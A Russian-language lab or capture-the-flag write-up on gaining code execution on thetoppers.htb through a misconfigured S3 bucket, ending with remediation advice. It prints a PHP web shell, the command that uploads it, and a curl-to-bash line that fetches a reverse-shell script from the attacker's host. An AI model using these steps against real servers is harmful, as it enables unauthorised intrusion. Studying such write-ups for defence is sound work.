В данном документе описывается эксплуатация **уязвимости неправильной конфигурации AWS S3 bucket**, которая позволяет злоумышленнику загрузить PHP-шелл на сервер и получить удаленное выполнение кода (RCE). В результате злоумышленник получает доступ к системе и находит флаг.

### Основные этапы эксплуатации уязвимости:

1. **Обнаружение поддомена `s3.thetoppers.htb`**:
    
    - С помощью инструмента **Gobuster** злоумышленник обнаруживает поддомен `s3.thetoppers.htb`, который связан с AWS S3 bucket.
        
    - Поддомен возвращает JSON-ответ `{"status": "running"}`, что указывает на наличие облачного хранилища S3.
        
2. **Исследование S3 bucket**:
    
    - Используя утилиту **awscli**, злоумышленник подключается к S3 bucket и обнаруживает, что он содержит файлы веб-сервера, включая `index.php` и `.htaccess`. Это указывает на то, что веб-сервер использует S3 bucket как хранилище для своих файлов.
        
3. **Загрузка PHP-шелла**:
    
    - Злоумышленник создает PHP-файл с кодом для выполнения команд на сервере:
        
        
        ```php
        <?php system($_GET['cmd']); ?>
		```        
    - Этот файл загружается в S3 bucket с помощью команды:
        ```php
        aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
		```        
    - После загрузки файла злоумышленник может выполнять команды на сервере, обращаясь к `http://thetoppers.htb/shell.php?cmd=<command>`.
        
4. **Получение обратного шелла**:
    
    - Злоумышленник создает bash-скрипт для обратного шелла и размещает его на своем локальном сервере с помощью Python:
        ```bash
        python3 -m http.server 8000
        ```

    - Затем с помощью команды `curl` злоумышленник загружает и выполняет этот скрипт на целевом сервере:
```bash
	http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
```
        
    - В результате злоумышленник получает обратный шелл с правами пользователя `www-data`.
        
5. **Получение флага**:
    
    - Злоумышленник находит флаг в файле `/var/www/flag.txt`.
        

### Уязвимости, которые были использованы:

1. **Неправильная конфигурация S3 bucket**:
    
    - S3 bucket был настроен таким образом, что позволял любому пользователю загружать файлы без должной аутентификации. Это привело к возможности загрузки PHP-шелла и выполнения произвольных команд на сервере.
        
2. **Отсутствие проверки загружаемых файлов**:
    
    - Веб-сервер не проверял загружаемые файлы на наличие вредоносного кода, что позволило злоумышленнику загрузить и выполнить PHP-шелл.
        
3. **Использование облачного хранилища как веб-корня**:
    
    - Веб-сервер использовал S3 bucket как корневую директорию для хранения файлов, что сделало возможным выполнение загруженного PHP-кода.
        

### Рекомендации по устранению уязвимостей:

1. **Ограничение доступа к S3 bucket**:
    
    - Настроить политики доступа к S3 bucket, чтобы только авторизованные пользователи могли загружать и изменять файлы.
        
    - Использовать IAM-роли и политики для строгого контроля доступа.
        
2. **Проверка загружаемых файлов**:
    
    - Внедрить механизмы проверки загружаемых файлов на наличие вредоносного кода.
        
    - Ограничить типы файлов, которые могут быть загружены в S3 bucket.
        
3. **Использование отдельного хранилища для статических файлов**:
    
    - Не использовать S3 bucket как корневую директорию веб-сервера. Вместо этого хранить статические файлы в отдельном хранилище, а динамические файлы (например, PHP) — на локальном сервере.
        
4. **Регулярный аудит безопасности**:
    
    - Проводить регулярные проверки конфигураций S3 bucket и веб-сервера на наличие уязвимостей.
        
    - Использовать инструменты для мониторинга и обнаружения подозрительной активности.
        

Таким образом, основная уязвимость, которую эксплуатировали, — это **неправильная конфигурация AWS S3 bucket**, которая позволила злоумышленнику загрузить и выполнить PHP-шелл, что привело к получению доступа к системе.